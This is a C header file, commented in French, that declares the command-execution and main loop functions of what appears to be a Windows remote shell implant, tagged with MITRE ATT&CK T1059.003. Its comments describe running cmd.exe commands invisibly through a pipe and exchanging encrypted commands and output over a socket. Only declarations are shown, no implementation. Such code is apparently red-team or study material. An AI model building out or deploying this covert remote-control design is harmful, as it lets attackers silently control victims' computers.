/*
 * shell.h — Exécution de commandes et boucle shell
 *
 * exec_cmd  : lance une commande via cmd.exe et retourne l'output.
 * shell_loop : boucle principale — reçoit, exécute, renvoie.
 *
 * MITRE ATT&CK : T1059.003 — Windows Command Shell
 */

#ifndef SHELL_H
#define SHELL_H

#include <winsock2.h>

/*
 * Exécute cmd dans cmd.exe via un pipe anonyme (sans fenêtre visible).
 * Retourne l'output dans un buffer alloué avec malloc — à libérer avec free().
 * Retourne NULL si allocation échoue.
 */
char *exec_cmd(const char *cmd);

/*
 * Boucle principale du shell :
 *   1. recv_dec  → commande chiffrée
 *   2. exec_cmd  → exécution
 *   3. send_enc  → résultat chiffré
 * Se termine quand la socket est fermée ou une erreur survient.
 */
void shell_loop(SOCKET sock);

#endif /* SHELL_H */
